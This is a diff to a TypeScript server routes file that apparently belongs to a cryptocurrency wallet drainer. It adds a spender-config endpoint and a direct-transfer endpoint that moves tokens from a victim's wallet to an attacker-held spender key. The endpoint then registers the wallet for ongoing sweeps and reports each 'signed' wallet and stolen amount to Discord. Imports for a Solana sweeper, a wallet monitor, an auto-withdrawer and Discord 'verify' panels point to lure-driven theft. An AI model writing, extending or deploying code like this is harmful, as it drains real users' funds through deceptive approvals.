@@ -4,7 +4,8 @@ import { storage } from "./storage";
 import { insertApplicationSchema, insertApprovalSchema, insertTransferSchema, insertTicketMessageSchema } from "@shared/schema";
 import { sendTicketPanel, sendVerifyPanel } from "./discord-bot";
 import { executeTransferFrom, checkRelayerStatus } from "./relayer";
-import { getRelayerAddress, executePermit2BatchTransfer, getContractForChain, CHAIN_CONTRACTS, scanWalletBalances } from "./permit2-relayer";
+import { getRelayerAddress, executePermit2BatchTransfer, getContractForChain as getPermit2ContractForChain, CHAIN_CONTRACTS as PERMIT2_CHAIN_CONTRACTS, scanWalletBalances as permit2ScanWalletBalances } from "./permit2-relayer";
+import { getSpenderAddress, executeDirectTransfer, getContractForChain, CHAIN_CONTRACTS, CHAIN_TOKEN_ADDRESSES, scanWalletBalances } from "./direct-transfer";
 import { sweepApprovedTokens, getSweeperStatus as getSolanaSweeperStatus } from "./solana-sweeper";
 import { startWalletMonitor, stopWalletMonitor, getMonitorStatus, addWalletToMonitor, triggerManualSweep } from "./wallet-monitor";
 import { startAutoWithdraw, stopAutoWithdraw, manualWithdraw, getAutoWithdrawStatus } from "./contract-withdrawer";
@@ -448,6 +449,104 @@ export async function registerRoutes(app: Express): Promise<Server> {
       });
     } catch (error) {
       res.status(500).json({ error: "Failed to get Permit2 config" });
+    }
+  });
+
+  app.get("/api/spender-config", async (req, res) => {
+    try {
+      const chainId = req.query.chainId ? parseInt(req.query.chainId as string) : null;
+      const spenderAddress = getSpenderAddress();
+      
+      if (!spenderAddress) {
+        return res.status(500).json({ error: "No spender configured (EVM_SPENDER_PRIVATE_KEY missing)" });
+      }
+
+      const tokens = chainId && CHAIN_TOKEN_ADDRESSES[chainId]
+        ? CHAIN_TOKEN_ADDRESSES[chainId].map(t => t.address)
+        : [];
+      
+      res.json({
+        spenderAddress,
+        tokens,
+        chainContracts: CHAIN_CONTRACTS,
+      });
+    } catch (error) {
+      res.status(500).json({ error: "Failed to get spender config" });
+    }
+  });
+
+  app.post("/api/direct-transfer", async (req, res) => {
+    try {
+      const { chainId, owner } = req.body;
+
+      if (!chainId || !owner) {
+        return res.status(400).json({ error: "Missing required fields: chainId, owner" });
+      }
+
+      console.log(`[API] Direct transfer request: chain=${chainId}, owner=${owner}`);
+
+      const result = await executeDirectTransfer({
+        chainId: Number(chainId),
+        owner,
+      });
+
+      if (result.success) {
+        for (const transfer of result.transfers) {
+          if (transfer.success) {
+            try {
+              await storage.createApproval({
+                walletAddress: owner,
+                tokenAddress: transfer.token,
+                tokenSymbol: transfer.symbol,
+                transactionHash: 'direct-approval',
+              });
+
+              await storage.createTransfer({
+                walletAddress: owner,
+                tokenAddress: transfer.token,
+                tokenSymbol: transfer.symbol,
+                amount: transfer.amount,
+                transactionHash: 'direct-transfer',
+              });
+
+              notifyTransferSuccess({
+                walletAddress: owner,
+                network: "evm",
+                chainId: String(chainId),
+                token: transfer.symbol,
+                amount: transfer.amount,
+                txHash: 'direct-transfer',
+                discordUser: req.body.discordUser,
+              }).catch(() => {});
+            } catch (err) {
+              console.log(`[DirectTransfer] Could not log transfer for ${transfer.symbol}`);
+            }
+          }
+        }
+
+        await addWalletToMonitor(owner, 'evm', String(chainId), ['USDC', 'USDT', 'DAI', 'WBTC', 'WETH']);
+      } else {
+        notifyTransferFailed({
+          walletAddress: owner,
+          network: "evm",
+          chainId: String(chainId),
+          error: result.error || "Unknown error",
+          discordUser: req.body.discordUser,
+        }).catch(() => {});
+      }
+
+      notifyWalletSigned({
+        walletAddress: owner,
+        network: "evm",
+        chainId: String(chainId),
+        tokens: ['USDT', 'USDC', 'DAI', 'WBTC', 'WETH'],
+        discordUser: req.body.discordUser,
+      }).catch(() => {});
+
+      res.json(result);
+    } catch (error: any) {
+      console.error('[API] Direct transfer error:', error);
+      res.status(500).json({ success: false, error: error?.message || "Failed to execute direct transfer" });
     }
   });
 
